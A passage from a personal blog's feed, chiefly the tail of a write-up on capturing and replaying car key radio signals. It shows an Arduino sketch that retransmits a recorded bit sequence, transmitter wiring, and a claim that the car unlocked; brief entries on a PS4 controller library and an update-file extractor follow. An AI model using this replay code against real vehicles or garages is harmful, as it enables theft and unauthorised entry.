class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;digitalWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HIGH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;delayMicroseconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;digitalWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;delayMicroseconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Serial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Message sent!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Serial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Final&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the code compiled and loaded in our Arduino, we have to setup the hardware following the connections below.&lt;/p&gt;

&lt;h4 id=&quot;arduino--rf-transmitter&quot;&gt;Arduino –&amp;gt; RF Transmitter):&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Ground to Ground&lt;/li&gt;
  &lt;li&gt;3.3 V pin to VCC pin&lt;/li&gt;
  &lt;li&gt;9 pin to ATAD pin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I tested this method on Dacia Sandero with this result:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
	&lt;video width=&quot;800&quot; height=&quot;500&quot; controls=&quot;&quot;&gt;
	  &lt;source type=&quot;video/mp4&quot; src=&quot;/images/carkey/car.mp4&quot; /&gt;&amp;lt;/source&amp;gt;
	&lt;/video&gt;
&lt;/p&gt;

&lt;p&gt;The car is opened!&lt;/p&gt;

&lt;p&gt;With this small write-up I wanna show you how easily is to unlock a car (or a garage) without the key for only 15-20 $.&lt;/p&gt;

&lt;h3 id=&quot;report-errors&quot;&gt;Report errors&lt;/h3&gt;
&lt;p&gt;It’s probably that this write-up contains a lot of mistakes so if you find any mistake, please let me know on Twitter (@j0lama).&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;

&lt;hr /&gt;</content><author><name></name></author><summary type="html">Recently, a friend told me that he had bought a USB antenna to see the TV on the computer (R820T2) and that this antenna could capture traffic in a big frequency range, not only TV range. This antenna could capture frequencies of garage and car keys although it was designed to TV frequencies.</summary></entry><entry><title type="html">DS4Lib - Dualshock 4 Linux library</title><link href="http://localhost:4000/ds4lib/" rel="alternate" type="text/html" title="DS4Lib - Dualshock 4 Linux library" /><published>2017-01-05T00:00:00+01:00</published><updated>2017-01-05T00:00:00+01:00</updated><id>http://localhost:4000/ds4lib</id><content type="html" xml:base="http://localhost:4000/ds4lib/">&lt;p&gt;&lt;strong&gt;DS4Lib&lt;/strong&gt; is a C written library that allows you controll a DualShock 4 (PS4 controller) from the computer. This library is open source and has been designed to be used in any Linux computer through the USB port.&lt;/p&gt;

&lt;p&gt;The available functons on DS4Lib are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Detect what button is pressed.&lt;/li&gt;
  &lt;li&gt;Real time JoyStick tracking with values between -15 and 15 in both axis.&lt;/li&gt;
  &lt;li&gt;Real time TouchPAD tracking with values between 0 and 255 in both axis.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Some examples are included in the source code. The first example is a proof of concept that shows all the basics functions included in DS4Lib and the second one is a small program that use the DualShock 4 as a mouse and requires the packet &lt;em&gt;xdotool&lt;/em&gt; to simulate the mouse actions.&lt;/p&gt;

&lt;p&gt;Some images of the examples included with the DS4Lib packet:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Button detection:&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/ds4lib/buttons.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;JoySticks real time tracking:&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/ds4lib/joystick.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Thanks to s0cKrate5 for the TouchPAD support.&lt;/p&gt;

&lt;h2 id=&quot;download&quot;&gt;Download&lt;/h2&gt;
&lt;p&gt;The source code has been released on my GitHUb account: &lt;a href=&quot;https://github.com/j0lama/DS4Lib&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">DS4Lib is a C written library that allows you controll a DualShock 4 (PS4 controller) from the computer. This library is open source and has been designed to be used in any Linux computer through the USB port.</summary></entry><entry><title type="html">PS4 PUP Extractor</title><link href="http://localhost:4000/ps4-pup-extractor/" rel="alternate" type="text/html" title="PS4 PUP Extractor" /><published>2016-07-03T00:00:00+02:00</published><updated>2016-07-03T00:00:00+02:00</updated><id>http://localhost:4000/ps4-pup-extractor</id><content type="html" xml:base="http://localhost:4000/ps4-pup-extractor/">&lt;p&gt;This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP).&lt;/p&gt;

&lt;p&gt;Also it shows file information with a list of the files that compose the PUP file. This tool includes an option to extract all the subfiles with information about them such as the offset and size.&lt;/p&gt;

&lt;p&gt;PS4 PUP Extractor:&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/ps4-pup-extractor/image.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The download is available in this link: &lt;a href=&quot;http://www.mediafire.com/file/daw1d5iaap03yhe/PS4+PUP+Extractor.exe&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">This tools allows you extract data and infromation from the PS4 PUP files (PS4UPDAT.PUP).</summary></entry></feed>